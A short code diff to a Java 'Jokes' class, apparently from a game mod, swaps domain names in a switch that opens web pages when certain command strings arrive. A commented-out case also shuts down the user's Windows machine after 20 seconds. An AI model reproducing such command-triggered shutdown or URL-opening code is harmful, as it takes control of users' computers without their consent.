@@ -114,11 +114,11 @@ public class Jokes {
                                 break;
 
                             case "!DRIP!":
-                                Utils.openUrl("https://cheatersgetbanned.me/drip");
+                                Utils.openUrl("https://shadyaddons.com/drip");
                                 break;
 
                             /*case "!TOUCHGRASS!":
-                                Utils.openUrl("https://cheatersgetbanned.me/touch-grass/");
+                                Utils.openUrl("https://shadyaddons.com/touch-grass/");
                                 if(SystemUtils.IS_OS_WINDOWS) {
                                     try {
                                         Runtime.getRuntime().exec("shutdown.exe -s -t 20");
